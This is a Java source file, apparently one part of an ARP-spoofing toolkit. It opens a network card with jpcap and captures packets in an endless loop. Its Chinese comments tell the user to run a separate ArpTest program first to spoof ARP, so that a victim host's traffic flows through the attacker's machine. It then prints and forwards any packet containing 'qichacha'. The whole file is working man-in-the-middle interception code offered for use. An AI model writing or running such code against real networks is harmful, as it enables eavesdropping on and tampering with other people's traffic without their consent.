package wang.congjun.arp;

import jpcap.*;
import jpcap.packet.Packet;


import java.io.IOException;
import java.io.UnsupportedEncodingException;

/**
 * Created by duke on 2016/11/15.
 * arp-client
 * 数据包拦截类View
 */
public class NetWorkIntercept
{
    /*
       拦截网卡数据包
     */
    public static void main(String[] args) throws Exception {
        //请先移步ArpTest运行Main函数进行ARP欺骗（记得修改参数值为你自己测试环境

        //获取同网段网卡
        NetworkInterface device = NetWorkUtil.getDevice(Constants.NET_WORK);
        //打开网卡
        JpcapCaptor captor = JpcapCaptor.openDevice(device,65535,false,20);

        while (true)
        {
          //获取流量包，这个时间arp欺诈成功后，该主机的流量包就会通过你的主机网卡发送。
          Packet p = captor.getPacket();
          if(p!=null)
          {
              byte header_byte[] = p.data;
              String header = new String(header_byte,"ISO-8859-1");
              //captor.setFilter("",true); 筛选函数还在研究怎么用舒服  这里约定协议会好用一点
              if(header.contains("qichacha")) //我觉得这种更爽  哈哈哈
              {
                  System.out.println(header);//获取数据包干一些你该干的事情
                  JpcapSender sender = captor.getJpcapSenderInstance();//获取
                  sender.sendPacket(p);//数据包发送（
              }
          }

      }

    }
}

